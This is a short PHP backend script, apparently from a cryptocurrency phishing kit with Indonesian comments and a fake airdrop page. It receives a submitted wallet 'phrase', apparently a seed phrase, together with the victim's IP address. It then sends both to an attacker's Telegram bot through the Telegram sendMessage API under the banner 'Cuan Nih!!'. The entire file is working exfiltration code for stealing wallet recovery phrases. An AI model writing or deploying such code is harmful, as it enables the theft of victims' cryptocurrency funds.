
<?php
session_start();
include "../auth/panel/zendsdev.php";
//cek ip addres target
//$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

//mengirimkan data ke bot dengan $_POST
$pars = $_POST['pars'];


//menampilkan data ke bot
$message = "
────────────
Cuan Nih!!
ip: " . $ip . "
──────────
• phrase : " . $pars . "
────────────
";

function sendMessage($idtele, $message, $token)
{
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?parse_mode=markdown&chat_id=" . $idtele;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($idtele, $message, $token);
//header('Location: ../airdrop.php');
?>